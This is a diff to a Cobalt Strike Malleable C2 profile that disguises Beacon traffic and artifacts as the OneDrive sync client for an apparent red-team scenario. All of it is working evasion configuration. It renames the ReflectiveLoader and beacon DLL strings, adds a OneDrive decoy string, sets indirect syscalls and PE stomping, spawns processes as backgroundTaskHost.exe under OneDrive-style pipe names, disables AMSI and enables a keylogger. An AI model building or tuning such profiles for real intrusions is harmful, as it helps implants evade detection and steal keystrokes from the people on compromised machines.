@@ -1,7 +1,10 @@
 # Malleable C2 Profile - OneDrive / SharePoint sync theme
 # CS 4.13 / Beacon Booster compatible
+# Sub-profile of reference_mod_413.profile (Azure Function redirector baseline)
 # Simulates OneDrive sync client and SharePoint Online API traffic
 # Target scenario: fenix-b
+
+# Various options
 
 set sample_name "OneDrive Sync Engine";
 set data_jitter "56";
@@ -15,13 +18,18 @@ set ssh_banner "OpenSSH_9.0p1 Ubuntu-1ubuntu8.7";
 set sleeptime "25000";
 set jitter "44";
 
+set killdate "20260916";
+
 set ssh_pipename "sppsvc_####";
 set tcp_frame_header "";
 set tcp_port "7443";
 
 set headers_remove "";
+
 set steal_token_access_mask "11";
+
 set tasks_proxy_max_size "94371840";
+
 set tasks_dns_proxy_max_size "71680";
 
 dns-beacon {
@@ -185,6 +193,11 @@ http-beacon {
     set data_required_length "192-448";
 }
 
+# ------------------------------------------------------------
+# BASELINE HARDENING - matches reference_mod_413.profile
+# See references/profile-baseline.md before editing.
+# ------------------------------------------------------------
+
 stage {
 
     set checksum "0";
@@ -198,6 +211,7 @@ stage {
 
     # Beacon Booster compatible: no transform-obfuscate, no prepend/append in stage transforms
 
+    # Separation knob: theme-matching strrep replacements
     transform-x86 {
         strrep "ReflectiveLoader" "SyncProvider";
         strrep "beacon.x64.dll" "filesync64.dl";
@@ -210,6 +224,7 @@ stage {
         strrep "beacon.dll" "fsync.dll";
     }
 
+    # Separation knob: theme-matching decoy string
     stringw "OneDrive Sync Provider";
 
     set allocator "VirtualAlloc";
@@ -220,12 +235,13 @@ stage {
     set syscall_method "Indirect";
 
     beacon_gate {
-      Comms;
+      All;
     }
 
     set stomppe "true";
     set userwx "false";
 
+    # Separation knobs: varied per profile
     set compile_time "02 May 2024 16:44:00";
     set entry_point "68720";
 
@@ -244,6 +260,7 @@ process-inject {
     set bof_allocator "VirtualAlloc";
     set bof_reuse_memory "true";
 
+    # Separation knob: 4 NOPs, execute order also reordered below
     transform-x86 {
         prepend "\x90\x90\x90\x90";
     }
@@ -263,11 +280,15 @@ process-inject {
 }
 
 post-ex {
+    # Separation knob: unique spawnto per profile
     set spawnto_x86 "%windir%\\syswow64\\backgroundTaskHost.exe";
     set spawnto_x64 "%windir%\\sysnative\\backgroundTaskHost.exe";
 
     set obfuscate "true";
+
+    # Separation knob: unique post-ex pipe per profile
     set pipename "OneDriveSync_####, OneDriveMachine_###";
+
     set smartinject "true";
     set amsi_disable "true";
     set keylogger "GetAsyncKeyState";
